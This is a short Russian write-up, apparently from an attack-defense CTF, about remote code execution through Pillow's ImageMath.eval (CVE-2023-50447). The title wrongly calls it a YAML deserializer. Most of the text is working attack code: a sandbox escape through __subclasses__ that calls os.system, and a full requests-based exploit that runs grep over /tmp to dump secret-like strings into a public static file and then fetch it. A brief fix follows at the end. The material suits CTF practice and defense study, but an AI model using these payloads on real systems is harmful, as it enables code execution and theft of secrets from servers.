# RCE в YAML десериалайзере

## как найти

`глазами`

## description

```python
def evaluate_album_art(expression: str, environment: Mapping[str, Any]) -> Any:
    from PIL import ImageMath

    return ImageMath.eval(expression, **dict(environment))

```

Находим это, находим CVE с косяком в environment и делаем PoC

## PoC

```python
from PIL import ImageMath
>>> ImageMath.eval('foo()', {'foo': int})
0 # функция вызывалась, хотя вызов int() блокируется
```

```python
# https://duartecsantos.github.io/2024-01-02-CVE-2023-50447/
from PIL import Image, ImageMath

image1 = Image.open('__class__')
image2 = Image.open('__bases__')
image3 = Image.open('__subclasses__')
image4 = Image.open('load_module')
image5 = Image.open('system')

expression = "().__class__.__bases__[0].__subclasses__()[104].load_module('os').system('whoami')"

environment = {
    image1.filename: image1,
    image2.filename: image2,
    image3.filename: image3,
    image4.filename: image4,
    image5.filename: image5
}

ImageMath.eval(expression, **environment)
```

### sploit

```python
import requests

burp0_url = "http://localhost:8080/api/media/albumart"
burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
burp0_headers = {
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://localhost:8080/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}
burp0_json = {
    "image_b64": "any valid image",
    "values": {
        "__bases__": "",
        "__class__": "",
        "__subclasses__": "",
        "expression": "().__class__.__bases__[0].__subclasses__()[120].load_module('os').system(\"grep -E '[A-Z0-9]{312}=' 2>&1 -r /tmp >/app/static/foo.txt \")",
        "load_module": "",
        "system": "",
    },
}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

burp0_url = "http://localhost:8080/static/foo.txt"
burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
burp0_headers = {
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://localhost:8080/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}
r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
print(r.text)

```

### fix

В качестве фикса функцию можно было удалить, она ничего не делала (или добавить банворды)

```python
def evaluate_album_art(expression: str, environment: Mapping[str, Any]) -> Any:
    for key in environment:
        if "__" in key:
            return None
    from PIL import ImageMath

    return ImageMath.eval(expression, **dict(environment))
```

